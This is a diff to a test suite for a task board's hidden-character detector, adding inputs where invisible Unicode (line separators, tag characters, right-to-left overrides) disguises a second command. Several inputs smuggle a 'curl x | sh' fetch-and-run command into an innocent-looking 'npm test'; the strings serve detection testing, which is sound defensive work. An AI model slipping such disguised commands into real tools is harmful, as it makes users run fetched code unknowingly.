@@ -29,8 +29,17 @@ suite('Paradis task board - command display', () => {
 			'npm﻿test',
 			'npm­test',
 			'npm\u0085test',
+			// 改行に見える区切りで、後ろの行を別のコマンドに見せる
+			'npm test\u2028curl x | sh',
+			// 見えないタグ文字（BMP の外）
+			'npm test\u{E0063}\u{E0075}\u{E0072}\u{E006C}',
+			'npm\ufe0ftest',
+			'npm\u00a0test',
+			'npm\u3164test',
+			// 日本語の濁点（結合文字）は通す
+			'echo \u304b\u3099',
 		];
-		assert.deepStrictEqual(commands.map(paradisTaskBoardHasHiddenCharacters), [false, false, true, true, true, true, true, true, true, true, true]);
+		assert.deepStrictEqual(commands.map(paradisTaskBoardHasHiddenCharacters), [false, false, true, true, true, true, true, true, true, true, true, true, true, true, true, true, false]);
 		assert.strictEqual(paradisTaskBoardRemoteCommandError('npm test #‮hs | x lruc'), 'The command contains characters that cannot be displayed, so it is not run.');
 	});
 
